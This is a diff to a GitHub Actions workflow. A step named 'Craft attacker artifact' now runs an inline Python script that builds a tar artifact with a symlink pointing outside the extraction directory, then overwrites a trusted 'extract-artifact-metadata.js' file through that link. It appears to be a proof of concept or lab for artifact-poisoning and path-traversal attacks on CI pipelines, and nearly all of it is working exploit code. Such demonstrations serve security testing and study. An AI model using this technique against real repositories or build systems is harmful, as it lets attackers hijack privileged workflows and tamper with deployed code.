@@ -10,8 +10,18 @@ jobs:
     steps:
       - name: Craft attacker artifact
         run: |
-          mkdir -p dist && echo '<h1>attacker controlled content</h1>' > dist/index.html
-          tar -czf deploy-artifact.tar.gz -C dist .
+          python3 - <<'PY'
+          import tarfile, io
+          t = tarfile.open('deploy-artifact.tar.gz','w:gz')
+          ti = tarfile.TarInfo('s'); ti.type = tarfile.SYMTYPE; ti.linkname = '../actionsim'
+          t.addfile(ti)
+          d = b'PWNED_BY_ARTIFACT\n'
+          ti2 = tarfile.TarInfo('s/extract-artifact-metadata.js'); ti2.size = len(d); ti2.mode = 0o644
+          t.addfile(ti2, io.BytesIO(d))
+          ti3 = tarfile.TarInfo('s'); ti3.size = 2; ti3.mode = 0o644
+          t.addfile(ti3, io.BytesIO(b'ok'))
+          t.close()
+          PY
           echo "${{ github.event.pull_request.number }}" > __metadata__pull_number.txt
           echo "${{ github.event.pull_request.head.sha }}" > __metadata__build_revision.txt
       - uses: actions/upload-artifact@v4
